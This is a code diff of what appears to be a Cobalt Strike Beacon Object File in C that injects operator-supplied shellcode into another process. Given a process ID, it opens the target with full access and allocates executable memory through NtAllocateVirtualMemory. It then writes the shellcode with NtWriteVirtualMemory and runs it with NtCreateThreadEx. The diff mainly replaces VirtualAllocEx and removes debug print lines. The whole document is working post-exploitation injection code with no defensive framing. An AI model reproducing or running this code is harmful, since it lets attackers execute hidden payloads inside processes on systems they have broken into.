@@ -7,38 +7,29 @@ WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAllocEx (HANDLE hProcess, LPVOID lpAddr
 
 void go(char * argc, int len)
 {
-	char* shellcodez;
-	SIZE_T sc_len;
+	char* shellcode;
+	SIZE_T shell_len;
 	datap	parser;
 	HANDLE Process_Handle;
 	CLIENT_ID id = {0};
 	OBJECT_ATTRIBUTES oa = {sizeof(oa)};
-	//LPVOID Alloc = NULL;
+	PVOID Alloc = NULL;
 	HANDLE Remote_Thread;
 	
 	BeaconDataParse(&parser, argc, len);
 	DWORD pid = BeaconDataInt(&parser);
-	sc_len = BeaconDataLength(&parser);
-	shellcodez = BeaconDataExtract(&parser, NULL);
-	//BeaconPrintf(CALLBACK_OUTPUT,"Hello: %s", shellcodez);
+	shell_len = BeaconDataLength(&parser);
+	shellcode = BeaconDataExtract(&parser, NULL);
 	id.UniqueProcess = pid;
 
 	NtOpenProcess(&Process_Handle, PROCESS_ALL_ACCESS, &oa, &id);
-	BeaconPrintf(CALLBACK_OUTPUT, "yo1");
-	sc_len++;
-	//NTSTATUS NTAVM = NtAllocateVirtualMemory(Process_Handle, &Alloc, 0, &calc_len, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
-	PVOID Alloc = KERNEL32$VirtualAllocEx(Process_Handle, NULL, sc_len, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
-	//NTSTATUS NTAVM = NtAllocateVirtualMemory(Process_Handle, &Alloc, 0, &calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-	//BeaconPrintf(CALLBACK_OUTPUT,"Hello: %d", &Alloc);
+	NtAllocateVirtualMemory(Process_Handle, &Alloc, 0, &shell_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 	if (Alloc)
 	{
-		BeaconPrintf(CALLBACK_OUTPUT, "yo2");
-		NtWriteVirtualMemory(Process_Handle, Alloc, shellcodez, sc_len-1, NULL);
+		NtWriteVirtualMemory(Process_Handle, Alloc, shellcode, shell_len, NULL);
 		NtCreateThreadEx(&Remote_Thread, THREAD_ALL_ACCESS, NULL, Process_Handle, Alloc, NULL, FALSE, 0, 0, 0, NULL);
-		BeaconPrintf(CALLBACK_OUTPUT, "Create that thread yo");
 	}
-	BeaconPrintf(CALLBACK_OUTPUT, "yo3");
-	
+
 	NtClose(Remote_Thread);
 	NtClose(Process_Handle);
 
